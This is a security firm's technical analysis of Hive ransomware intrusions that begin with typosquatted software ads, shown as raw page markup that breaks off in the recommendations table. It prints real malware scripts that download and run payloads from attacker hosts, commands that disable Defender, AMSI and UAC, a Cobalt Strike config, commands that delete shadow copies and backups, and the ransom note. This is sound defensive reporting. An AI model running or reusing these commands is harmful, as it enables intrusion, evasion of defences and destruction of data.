Read about our findings now."/><meta name="twitter:image" content="https://edge.sitecorecloud.io/krollllc17bf0-kroll6fee-proda464-0e9b/media/Kroll-Images/Insights/Thumbnail/hive-ransomware-technical-analysis-initial-access-discovery.png?h=180&amp;iar=0&amp;w=160"/><meta name="google-site-verification" content="&lt;p&gt;&lt;em&gt;Hive has been seized by law enforcement, but we&#x27;re likely to still see these initial access methods and tactics used across other threat actor groups.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Kroll has observed an increase in Hive ransomware incidents across a wide range of industry verticals. A new trend of initial infection vector (IIV) has been identified by Kroll analysts that may relate to the increase of activity and the varying nature of targets. Across a number of incidents, the IIV was attributed to IT administrators looking to download common softwares from Google such as TeamViewer, Zoom and AnyDesk, and they were provided with advertisements for these tools at the top of their search results. We recently &lt;a href=&quot;/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer&quot;&gt;reported&lt;/a&gt;&amp;nbsp;on this trend, where threat actors were abusing Google Ads to deploy malware via downloads.&lt;/p&gt;
&lt;p&gt;When these IT administrators downloaded the desired &amp;ldquo;tools&amp;rdquo; from the malicious ad links, Batloader was also unknowingly delivered. Batloader is an initial access malware utilized to deliver tools such as Zloader, Ursnif and Vidar to further establish the threat actor&amp;rsquo;s foothold within a network. Cobalt Strike can then be installed to maintain command and control. Once the threat actor has acquired credentials and identified sensitive files for exfiltration, they are able to utilize common exfiltration tools such as WinSCP and &lt;a href=&quot;/en/insights/publications/cyber/new-m365-business-email-compromise-attacks-with-rclone&quot;&gt;Rclone&lt;/a&gt;&amp;nbsp;to extract a victim&amp;rsquo;s data. The ransomware binary is then executed with a specific identifiable encryption key and this is used to create the ransom note named &amp;ldquo;HOW_TO_DECRYPT.txt&amp;rdquo; and appends a specific file extension related to a dropped key file within the root of C:\.&lt;/p&gt;
&lt;p&gt;A login is provided for the victim to access the Hive &amp;ldquo;Sales Department&amp;rdquo; onion site, and if demands are not met, data is then shared on their &amp;ldquo;Hive Leak&amp;rdquo; onion site.&lt;/p&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;h2 style=&quot;font-size: 24px;&quot;&gt;Timeline of Incident&lt;/h2&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://edge.sitecorecloud.io/krollllc17bf0-kroll6fee-proda464-0e9b/media/Kroll-Images/Insights/hive-ransomware-technical-analysis-initial-access-discovery-timeline.svg?h=100&amp;amp;w=100&quot; style=&quot;height: 100%; width: 100%; margin-top: 0px; margin-bottom: 0px;&quot; alt=&quot;Hive Ransomware Technical Analysis and Initial Access Discovery&quot; /&gt;&lt;/p&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;h3 style=&quot;font-size: 20px;&quot;&gt;Initial Exploit&lt;/h3&gt;
&lt;p&gt;In a recent case, after the IT administrator searched for TeamViewer and clicked the advertisement link, they were directed to https://caroseyama[.]xyz/9hjLXZR?https://www.teamviewer[.]com/en/customer-support. This link then redirected to https://teamviewclouds[.]com/index.php. Our experts analyzed the teamviewclouds domain and identified a large number of similar typosquatted domains for a wide range of common software hosted on the same IP address and hosted by regprivate[.]ru.&amp;nbsp; &amp;nbsp; Most of these domains were inactive, which suggests that the threat actors are continually creating new advertisements. An installation file is then provided from https://dc444.4sync[.]com/download/fXx-c_iZ/InstallerV36__218_.zip, which is the Batloader .msi file. The file sharing provider 4sync has been identified across separate Batloader incidents and appears to serve the Batloader .msi download.&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;zoomyclouds[.]com, zoomedes[.]com, zohosz[.]com, teamviewerq[.]com, teamviewer-cloudcomputing[.]com, teamviewclous[.]com, teamviewclouds[.]com, teamcloudcomputing[.]com, staroness[.]com, standartnotess[.]com, slackicorp[.]com, programmbatcheck[.]com, openofficee[.]com, logmein-cloud[.]com, logcloudmein[.]com, gimpimage[.]com, foxitr[.]com, fortinetq[.]com, fidelyclouds[.]com, evernotcorp[.]com, dom82[.]net, cloudsslack[.]com, anydeskos[.]com, anydeskis[.]com, anyclouddesk[.]com, adubecorp[.]com&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 1: Example of Typosquatted domains associated with teamviewclouds[.]com&lt;/p&gt;
&lt;p&gt;The installer itself installed &lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://www.novapdf.com/&quot; target=&quot;_blank&quot;&gt;novaPDF&lt;/a&gt; by Softland rather than TeamViewer and dropped PowerShell scripts &amp;ldquo;scrED95.ps1&amp;rdquo; and &amp;ldquo;pssEDC6.ps1&amp;rdquo;. &amp;ldquo;pssEDC6.ps1&amp;rdquo; is a conversion script that creates the initial downloader script &amp;ldquo;scrED95.ps1&amp;rdquo;. This script downloads the initial Batloader script &amp;ldquo;update.bat&amp;rdquo; and sets the working directory to the user&amp;rsquo;s appdata local directory. The scripts are executed by PowerShell as shown in figure 2.&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -File &quot;C:\Users\user\AppData\Local\Temp\pssEDC6.ps1&quot; -propFile &quot;C:\Users\user\AppData\Local\Temp\msiED94.txt&quot; -scriptFile &quot;C:\Users\user\AppData\Local\Temp\scrED95.ps1&quot; -scriptArgsFile &quot;C:\Users\user\AppData\Local\Temp\scrED96.txt&quot; -propSep &quot; :&amp;lt;-&amp;gt;: &quot; -testPrefix &quot;_testValue.&quot;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 2: PowerShell command to create initial downloader&lt;/p&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;Set-Location &quot;$Env:USERPROFILE\AppData\Roaming&quot;
Invoke-RestMethod -Uri https://cloudupdatesss[.]com/g5i0nq/index/e6a5614c379561c94004c531781ee1c5/?servername=msi -OutFile update.bat
Start-Process -WindowStyle hidden -FilePath &quot;$Env:USERPROFILE\AppData\Roaming\update.bat&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 3: scrED95.ps1&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1583.001: Acquire Domain Names&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1608.004: Stage Capabilities - Drive-by Target&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1588: Obtain Capabilities&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1189: Drive-by Compromise&lt;/p&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;h3 style=&quot;font-size: 20px;&quot;&gt;Toolkit Deployment and Escalation&lt;/h3&gt;
&lt;p&gt;To maintain persistence and to gain increased privileges, Hive actors leverage Batloader to download Ursnif and Vidar, but also attempt to gain the highest privileges possible to install the malware. The initial Batloader script downloads &amp;ldquo;requestadmin.bat&amp;rdquo; and attempts to execute it with evaluated privileges by &lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://www.nirsoft.net/utils/nircmd.html&quot; target=&quot;_blank&quot;&gt;nircmd.exe&lt;/a&gt;.&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/f69af5bc8498d0ebeb37b801d450c046/?servername=msi -OutFile requestadmin.bat
powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/c003996958c731652178c7113ad768b7/?servername=msi -OutFile nircmd.exe

cmd  /c nircmd elevatecmd exec hide &quot;requestadmin.bat&quot;
ping  127.0.0.1 -n 20&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 4: update.bat&lt;/p&gt;
&lt;p&gt;The &amp;ldquo;requestadmin.bat&amp;rdquo; then attempts to download further scripts named &amp;ldquo;runanddelete.bat&amp;rdquo; and &amp;ldquo;scripttodo.ps1&amp;rdquo;. The script itself also attempts to whitelist specific paths from Windows Defender before downloading &lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://nsudo.m2team.org/en-us/&quot; target=&quot;_blank&quot;&gt;Nsudo.exe&lt;/a&gt;. Nsudo provides capabilities to execute binaries with elevated privileges, which are then used to edit the system registry to disable the user access control prompt and to disable task manager and other registry tools. The Windows power system settings tool Powercfg is then executed to disable sleep, which will allow the threat actor to maintain persistent access.&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;set pop=%systemroot%
cd %APPDATA%
powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/a3874ddb552a5b45cade5a2700d15587/?servername=msi -OutFile runanddelete.bat
cd %APPDATA%
powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/fa777fbbb8f055cb8bfcba6cb41c62e7/?servername=msi -OutFile scripttodo.ps1
start /b PowerShell -NoProfile -ExecutionPolicy Bypass -Command &quot;&amp;amp; &#x27;./scripttodo.ps1&#x27;&quot;
del nircmd.exe
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath &#x27;%USERPROFILE%\AppData\Roaming&#x27;
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath &#x27;%USERPROFILE%\AppData\Roaming\&#x27;

--- &amp;lt;snip&amp;gt;&lt;snip&gt; ---

powershell Invoke-WebRequest https://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
set pop=%systemroot%
NSudo -U:T -ShowWindowMode:Hide reg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot;  /v &quot;ConsentPromptBehaviorAdmin&quot; /t REG_DWORD /d &quot;0&quot; /f
NSudo -U:T -ShowWindowMode:Hide reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration&quot;  /v &quot;Notification_Suppress&quot; /t REG_DWORD /d &quot;1&quot; /f
NSudo -U:T -ShowWindowMode:Hide reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v &quot;DisableTaskMgr&quot; /t REG_DWORD /d &quot;1&quot; /f
NSudo -U:T -ShowWindowMode:Hide reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v &quot;DisableCMD&quot; /t REG_DWORD /d &quot;1&quot; /f
NSudo -U:T -ShowWindowMode:Hide reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v &quot;DisableRegistryTools&quot; /t REG_DWORD /d &quot;1&quot; /f
NSudo -U:T -ShowWindowMode:Hide reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer&quot; /v &quot;NoRun&quot; /t REG_DWORD /d &quot;1&quot; /f
powercfg.exe /SETACVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEOCONLOCK 1800
powercfg -change -standby-timeout-dc 3000
powercfg -change -standby-timeout-ac 3000

start /b &quot;&quot; cmd /c del &quot;%~f0&quot;&amp;amp;exit /b
&lt;/snip&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 5: requestadmin.bat&lt;/p&gt;
&lt;p&gt;The script &amp;ldquo;runanddelete.bat&amp;rdquo; appears to be a modified open-source script named &amp;ldquo;&lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://gist.github.com/Maximus5/a7fb0a11b3c33e5d96b0&quot; target=&quot;_blank&quot;&gt;get-admin.bat&lt;/a&gt;&amp;rdquo;. This script attempts to spawn the user access control prompt to gain the increased privileges to then spawn an Administrator shell, via a created file named &amp;ldquo;getadmin.vbs&amp;rdquo;. Once increased privileges are achieved, it then attempts to run Ursnif (d2ef5.exe).  Ursnif can be used to extract system information and seek to steal user credentials.&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;@echo off

title Installing Packages 
:: BatchGotAdmin
::-------------------------------------
REM  --&amp;gt; Check for permissions
&amp;gt;nul 2&amp;gt;&amp;amp;1 &quot;%SYSTEMROOT%\system32\cacls.exe&quot; &quot;%SYSTEMROOT%\system32\config\system&quot;

REM --&amp;gt; If error flag set, we do not have admin.
if &#x27;%errorlevel%&#x27; NEQ &#x27;0&#x27; (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^(&quot;Shell.Application&quot;^) &amp;gt; &quot;%temp%\getadmin.vbs&quot;
    set params = %*:&quot;=&quot;
    echo UAC.ShellExecute &quot;cmd.exe&quot;, &quot;/c %~s0 %params%&quot;, &quot;&quot;, &quot;runas&quot;, 0 &amp;gt;&amp;gt; &quot;%temp%\getadmin.vbs&quot;

    &quot;%temp%\getadmin.vbs&quot;
    del &quot;%temp%\getadmin.vbs&quot;
    exit /B

:gotAdmin

echo  Installing Necessary Packages.....Please Wait.....

cd %APPDATA%

start /b d2ef5.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 6: runanddelete.bat&lt;/p&gt;
&lt;p&gt;The script &amp;ldquo;scripttodo.ps1&amp;rdquo; initially installs GNU Privacy Guard for Windows (&amp;ldquo;&lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://www.gpg4win.org/&quot; target=&quot;_blank&quot;&gt;Gpg4Win&lt;/a&gt;&amp;rdquo;), which is a file encryption software. Vidar binaries are then downloaded and decrypted by Gpg4Win along with a further attempt to download Nsudo.exe. The Vidar binaries are then executed, likely in an attempt to further gather system information and to gather credentials. The script also creates exclusions in the registry to prevent Windows Defender alerting on execution.&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$DownloadFolderPath,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$DownloadUrl = &#x27;http://files.gpg4win[.]org/gpg4win-2.2.5.exe&#x27;
		
	)

--- &amp;lt;snip&amp;gt;&lt;snip&gt; ---

if ($Condition_All ) 
{
    $URL = &quot;https://cloudupdatesss[.]com/t1mw0r/index/d2ef590c0310838490561a205469713d/?servername=msi&amp;amp;arp=&quot;+ $IP_count + &quot;&amp;amp;domain=&quot; + $UserDomain + &quot;&amp;amp;hostname=&quot; + $UserPCname
   $URL1 = &quot;https://cloudupdatesss[.]com/t1mw0r/index/i850c923db452d4556a2c46125e7b6f2/?servername=msi&amp;amp;arp=&quot;+ $IP_count + &quot;&amp;amp;domain=&quot; + $UserDomain + &quot;&amp;amp;hostname=&quot; + $UserPCname
   $URL2 = &quot;https://cloudupdatesss[.]com/t1mw0r/index/b5e6ec2584da24e2401f9bc14a08dedf/?servername=msi&amp;amp;arp=&quot;+ $IP_count + &quot;&amp;amp;domain=&quot; + $UserDomain + &quot;&amp;amp;hostname=&quot; + $UserPCname
		
	Invoke-WebRequest $URL -outfile p9d2s.exe.gpg
	Invoke-WebRequest $URL1 -outfile p9d2.bat
	Invoke-WebRequest $URL2 -outfile ata.exe.gpg
}

--- &amp;lt;snip&amp;gt;&lt;snip&gt; ---

Remove-Item -Path &quot;HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}&quot; -Recurse
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$uri = &#x27;https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1&#x27;
$moduleFolderPath = &#x27;C:\Program Files\WindowsPowerShell\Modules\GnuPg&#x27;
$null = New-Item -Path $moduleFolderPath -Type Directory
Invoke-WebRequest -Uri $uri -OutFile (Join-Path -Path $moduleFolderPath -ChildPath &#x27;GnuPg.psm1&#x27;)
$env:APPDATA
Install-GnuPG -DownloadFolderPath $env:APPDATA
echo &quot;START&quot;
Add-MpPreference -ExclusionExtension &amp;ldquo;exe&amp;rdquo;
Add-MpPreference -ExclusionExtension &amp;ldquo;dll&amp;rdquo;
Remove-Encryption -FolderPath $env:APPDATA -Password &#x27;105b&#x27;
Invoke-WebRequest https://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe

.\p9d2s.exe
.\ata.exe
.\p9d2.bat&lt;/snip&gt;&lt;/snip&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 7: scripttodo.ps1 snippets&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1059: Command and Scripting Interpreter&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1064: Scripting&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1548.002: Bypass User Account Control&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1222: File and Directory Permissions Modification&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1583.001: Acquire Domain Names&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1027: Obfuscated Files&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1056: Input Capture&lt;/p&gt;
&lt;p&gt;The post-exploitation tool Cobalt Strike is often leveraged to provide command and control, utilizing both HTTP and SMB beacons to move laterally and report back to the threat actor&amp;rsquo;s infrastructure. &lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;{
  &quot;BeaconType&quot;: [
    &quot;HTTP&quot;
  ],
  &quot;Port&quot;: 80,
  &quot;SleepTime&quot;: 45000,
  &quot;MaxGetSize&quot;: 1403644,
  &quot;Jitter&quot;: 37,
  &quot;C2Server&quot;: &quot;softeruplive[.]com,/jquery-3.3.1.min.js&quot;,
  &quot;HttpPostUri&quot;: &quot;/jquery-3.3.2.min.js&quot;,
  &quot;Malleable_C2_Instructions&quot;: [
    &quot;Remove 1522 bytes from the end&quot;,
    &quot;Remove 84 bytes from the beginning&quot;,
    &quot;Remove 3931 bytes from the beginning&quot;,
    &quot;Base64 URL-safe decode&quot;,
    &quot;XOR mask w/ random key&quot;
  ],
  &quot;SpawnTo&quot;: &quot;AAAAAAAAAAAAAAAAAAAAAA==&quot;,
  &quot;HttpGet_Verb&quot;: &quot;GET&quot;,
  &quot;HttpPost_Verb&quot;: &quot;POST&quot;,

--- &amp;lt;SNIP&amp;gt;&lt;snip&gt; ---&lt;/snip&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 8: Cobalt Strike HTTP beacon&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1001: Data Obfuscation&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1573.001: Encrypted Channel: Symmetric Cryptography&lt;/p&gt;
&lt;p&gt;If required, the threat actors have also used minidump and ProcDump to dump the LSASS process. This is likely an attempt to dump NTLM credential hashes for password cracking, or for pass the hash techniques. PowerSploit has also been identified with attempts to run &amp;ldquo;Invoke-Kerberoast&amp;rdquo; to gain Kerberos ticket hashes for service accounts. This would likely provide the threat actor with increased privileges or access if successful.&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1003.001: Credential Dumping &amp;ndash; LSASS Memory&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1558.003: Kerberoasting&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1550: Use Alternate Authentication Material&lt;/p&gt;
&lt;p&gt;Common remote access software such as Splashtop can be installed via Cobalt Strike to provide a persistent, seemingly legitimate access to the network. This also allows the threat actor to conduct hands-on operations. Remote Desktop Protocol (RDP) is used with legitimate accounts to navigate across the network.&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1219: Remote Access Software&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1021: Remote Services&lt;/p&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;h3 style=&quot;font-size: 20px;&quot;&gt;Internal Scouting&lt;/h3&gt;
&lt;p&gt;Once the threat actor gains a foothold within the network, Kroll has observed the use of tools such as &lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://attack.mitre.org/software/S0552/&quot; target=&quot;_blank&quot;&gt;ADFind&lt;/a&gt; to identify accounts and servers. Other common tools such as nslookup and whoami have also been used to gain initial system information.&lt;/p&gt;
&lt;p&gt;The Exchange PowerShell module Get-DomainController has also been identified when leveraging Cobalt Strike to execute commands. This module provides information on the domain controller for the local domain. &lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAOgA3ADUANwAyAC8AJwApADsAIABHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA

---Decoded Base64 string---
IEX (New-Object Net.Webclient).DownloadString(&#x27;http://localhost:7572/&#x27;); Get-DomainController&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 9: Example of Cobalt Strike commands&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1482: Domain Trust Discovery&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1087: Account Discovery&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1016: System Network Configuration Discovery&lt;/p&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;h3 style=&quot;font-size: 20px;&quot;&gt;Mission Execution&lt;/h3&gt;
&lt;p&gt;The threat actors look to identify sensitive files for exfiltration before encrypting devices by using tools such as Rclone to automate data extraction to cloud storage. Kroll has observed that threat actors have searched for files using PowerShell and manual traversal across files.&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1005: Data from Local System&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1567.002: Exfiltration Over Web Service : Exfiltration to Cloud Storage&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1020: Automate Exfiltration&lt;/p&gt;
&lt;p&gt;To push the ransomware binary across the network, the sysinternals tool PsExec has been leveraged as well as custom scripts to deploy the encryptor. The ransomware binary itself appears to come in both 64 and 32 bit versions. To encrypt, the binary requires the login and password &quot;.\windows_x64_encrypt.exe -u login:password&amp;rdquo;. There are other options available for file encryption including:&lt;/p&gt;
&lt;ul style=&quot;margin-left: 40px;&quot;&gt;
    &lt;li&gt;-local-only: Encrypt only local files.&lt;/li&gt;
    &lt;li&gt;-no-discovery: Do not look for network shares.&lt;/li&gt;
    &lt;li&gt;-explicit-only: Encrypt specific directories.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;By default, the binary prevents recovery by deleting volume shadow copies &amp;ldquo;vssadmin.exe delete shadows /all /quiet&amp;rdquo; and deletes system backups with &amp;ldquo;wbadmin.exe delete systemstatebackup&amp;rdquo; and &amp;ldquo;wbadmin.exe delete catalog-quiet&amp;rdquo; before preventing recovery from boot with &amp;ldquo;\bcdedit.exe /set {default} recoveryenabled No&amp;rdquo; and &amp;ldquo;bcdedit.exe&quot; /set {default} bootstatuspolicy ignoreallfailures&amp;rdquo;. &lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/&quot; target=&quot;_blank&quot;&gt;The binary encrypts files&lt;/a&gt;, except for &amp;ldquo;.lnk&amp;rdquo; files and binaries within &amp;ldquo;C:\windows&amp;rdquo;, before generating two key files in the root of C:\. The key files also determine the extension string added to the encrypted files along with a base64 encoded pointer.&lt;/p&gt;
&lt;pre class=&quot;light&quot;&gt;&lt;code&gt;Your network has been breached and all data were encrypted.                    
Personal data, financial reports and important documents are ready to disclose.

To decrypt all the data and to prevent exfiltrated files to be disclosed at    
http://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion/         
you will need to purchase our decryption software.   
                          
Please contact our sales department at:   
                                     
   http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/      
   
      Login: &amp;lt;redacted&amp;gt;&lt;redacted&gt; 
      Password: &amp;lt;redacted&amp;gt;&lt;redacted&gt;
	  
To get an access to .onion websites download and install Tor Browser at:       
   https://www.torproject[.]org/ (Tor Browser is not related to us) 
   
   
Follow the guidelines below to avoid losing your data:   
                      
 - Do not modify, rename or delete *.key files. Your data will be              
   undecryptable.                                                              
 - Do not modify or rename encrypted files. You will lose them.                
 - Do not report to the Police, FBI, etc. They don&#x27;t care about your business. 
   They simply won&#x27;t allow you to pay. As a result you will lose everything.   
 - Do not hire a recovery company. They can&#x27;t decrypt without the key.         
   They also don&#x27;t care about your business. They believe that they are        
   good negotiators, but it is not. They usually fail. So speak for yourself.  
 - Do not reject to purchase. Exfiltrated files will be publicly disclosed.
&lt;/redacted&gt;&lt;/redacted&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;Figure 10: HOW_TO_DECRYPT.txt&lt;/p&gt;
&lt;p&gt;MITRE ATT&amp;amp;CK: T1570 : Lateral Tool Transfer&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1490 : Inhibit System Recovery&lt;br /&gt;
MITRE ATT&amp;amp;CK: T1486 : Data Encrypted for Impact&lt;/p&gt;
&lt;p&gt;Once data has been extracted and encrypted, victims are directed to their customer page to negotiate the ransom fee. If a fee is not agreed, then victims could be placed onto their shaming site: &amp;ldquo;HiveLeaks.&amp;rdquo;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://edge.sitecorecloud.io/krollllc17bf0-kroll6fee-proda464-0e9b/media/Kroll-Images/Insights/hive-ransomware-technical-analysis-initial-access-discovery-hiveleaks.png?h=100&amp;amp;w=100&quot; style=&quot;height: 100%; width: 100%; margin-top: 0px; margin-bottom: 0px;&quot; alt=&quot;Hive Ransomware Technical Analysis and Initial Access Discovery&quot; /&gt;&lt;/p&gt;

&lt;/p&gt;
&lt;h2 style=&quot;font-size: 24px;&quot;&gt;Recommendations&lt;/h2&gt;
&lt;p&gt;Kroll has identified recommendations relating to this alert:&lt;/p&gt;
&lt;table style=&quot;width: 100%; height: 100%;&quot;&gt;
    &lt;tbody&gt;
        &lt;tr&gt;
            &lt;td style=&quot;text-align: left; vertical-align: middle;&quot;&gt;
            &lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;Recommendation&lt;/strong&gt;&lt;/p&gt;
            &lt;/td&gt;
            &lt;td&gt;
            &lt;p style=&quot;text-align: center;&quot;&gt;&lt;strong&gt;Observation&lt;/strong&gt;&lt;/p&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;
            &lt;p&gt;Monitor PowerShell execution&lt;/p&gt;
            &lt;p&gt;Ensure PowerShell is logged, and create detections for encoded script execution.&lt;/p&gt;
            &lt;/td&gt;
            &lt;td&gt;
            &lt;p&gt;The threat actor utilized Cobalt Strike. Monitoring PowerShell execution can identify malicious activity associated with Cobalt Strike.
            &lt;/p&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;
            &lt;p&gt;Enable credential guard&lt;/p&gt;
            &lt;p&gt;&lt;a rel=&quot;noopener noreferrer&quot; href=&quot;https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard&quot; target=&quot;_blank&quot;&gt;Windows Credential Guard&lt;/a&gt; can provide protection against password extraction and other authentication attacks.&lt;/p&gt;
            &lt;/td&gt;
            &lt;td&gt;
            &lt;p&gt;The threat actor dumped LSASS and conducted Kerberos attacks. Credential guard can offer some protection against these attacks.&lt;/p&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;
            &lt;p&gt;Audit user, administrator and service accounts&lt;/p&gt;
            &lt;p&gt;Ensure accounts have the correct access and privileges. Implement the principle of least privilege.&lt;/p&gt;
            &lt;/td&gt;
            &lt;td&gt;
            &lt;p&gt;The threat actor is often able to install tools on user endpoints. Limiting the privileges of users can prevent a threat actor from installing malicious software.&lt;/p&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;
            &lt;p&gt;Implement multi-factor authentication&lt;/p&gt;
            &lt;p&gt;Multi-factor authentication can restrict access to sensitive areas and can prevent lateral movement.&lt;/p&gt;
            &lt;/td&gt;
            &lt;td&gt;
            &lt;p&gt;Enabling multi-factor authentication can prevent a threat actor from moving laterally and accessing sensitive data.&lt;/p&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;
            &lt;p&gt;Review backup strategies&lt;/p&gt;
            &lt;p&gt;Ensure multiple backups are taken and at least one backup is isolated from the network.&lt;/p&gt;
            &lt;/td&gt;
            &lt;td style=&quot;text-align: left; vertical-align: middle;&quot;&gt;
            &lt;p&gt;As a ransomware actor&amp;rsquo;s main aim is to disrupt business, ensuring a viable backup and recovery strategy is in place can allow a business to recover quickly.&lt;/p&gt;
            &lt;p&gt;
            &lt;/p&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
            &lt;td&gt;
